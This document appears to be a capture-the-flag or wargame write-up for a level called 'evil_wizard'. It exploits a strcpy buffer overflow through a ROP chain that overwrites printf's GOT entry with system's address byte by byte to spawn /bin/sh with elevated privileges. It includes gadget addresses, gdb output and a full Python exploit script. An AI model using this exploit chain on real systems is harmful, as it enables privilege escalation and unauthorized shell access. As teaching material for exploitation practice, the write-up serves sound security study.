# Vulnerability
```c
char buffer[256];
strcpy(buffer, argv[1]);
```
This program uses strcpy function that does not check boundary.

# Exploitation
```c
// save sfp 
	memcpy(saved_sfp, buffer+264, 4);

// restore sfp 
memcpy(buffer+264, saved_sfp, 4);

// disturbance RET sleding
memset(buffer+length, 0, (int)0xff000000 - (int)(buffer+length));
```
By this code, I am not able to do RET Sleding and it removes all data except my argv[1].

But this challenge gives me some potion:
```c
// healing potion for you
        setreuid(geteuid(), geteuid());
        setregid(getegid(), getegid());
// magic potion for you

void pop_pop_ret(void)
{
	asm("pop %eax");
	asm("pop %eax");
	asm("ret");
}
```
This code gives me assembly code and permission.

To call function continously, I should not use library address because it starts with '\x00'.

So I will use `GOT Overwrite` that is a technic which overwrites GOT address with another function's GOT.

I change printf's GOT address with system's GOT then when I call printf function, system function will executed.

The payload will be:
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
| A*268 | strcpy | pop pop ret | printf's got | system's got[1] | strcpy | pop pop ret | printf's got + 1 | system's got[2] | strcpy | pop pop ret | printf's got + 2 | system's got[3] | strcpy | pop pop ret | printf's got + 3 | system's got[4] | printf's plt | "AAAA" | /bin/sh's address |
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```
First, find strcpy's address(used to got overwrite):
```assembly
0x08048623 <main+207>:	push   %eax
0x08048624 <main+208>:	call   0x8048494 <_init+200>
0x08048629 <main+213>:	add    $0x10,%esp
```
strcpy's address: 0x08048494

Second, find pop pop ret address(used to call function continously):
```assembly
[hell_fire@Fedora_1stFloor ~]$ objdump -d ./evil_wizard | grep "pop" -A 2 | grep "ret" -B 2
 80484e6:	5b                   	pop    %ebx
 80484e7:	c9                   	leave  
 80484e8:	c3                   	ret    
--
0804854c <pop_pop_ret>:
--
 804854f:	58                   	pop    %eax
 8048550:	58                   	pop    %eax
 8048551:	c3                   	ret  
 ```
pop pop ret's address: 0x0804854f

Third, find printf's got address(will be covered with system's got function and called):
```assembly
0x08048686 <main+306>:	push   $0x8048784
0x0804868b <main+311>:	call   0x8048424 <_init+88>
0x08048690 <main+316>:	add    $0x10,%esp
```
Checks 0x08048424's instruction:
```assembly
(gdb) x/3i 0x08048424
0x8048424 <_init+88>:	jmp    *0x8049884
0x804842a <_init+94>:	push   $0x18
0x804842f <_init+99>:	jmp    0x80483e4 <_init+24>
(gdb) p system
$1 = {<text variable, no debug info>} 0x7507c0 <system>
(gdb) 
```
printf's got address: 0x08049884

system's address    : 0x007507c0
# Payload
```python
import os
from struct import *
p = lambda x:pack("<L", x)
target = "/home/hell_fire/evil_wizard"

strcpy_plt = 0x08048494
printf_plt = 0x08048424
pop_pop_ret = 0x0804854f
printf_got = 0x08049884
system_got_1 = 0x0804852c # c0
system_got_2 = 0x08048154 # 07
system_got_3 = 0x080486fa # 75
system_got_4 = 0x080483d4 # 00

payload = ""
payload = payload + "A"*268
payload = payload + p(strcpy_plt) + p(pop_pop_ret) + p(printf_got+0) + p(system_got_1)
payload = payload + p(strcpy_plt) + p(pop_pop_ret) + p(printf_got+1) + p(system_got_2)
payload = payload + p(strcpy_plt) + p(pop_pop_ret) + p(printf_got+2) + p(system_got_3)
payload = payload + p(strcpy_plt) + p(pop_pop_ret) + p(printf_got+3) + p(system_got_4)
payload = payload + p(printf_plt) + "AAAA" + "\x03\x36\x83"

os.execv(target, [target, payload])
```
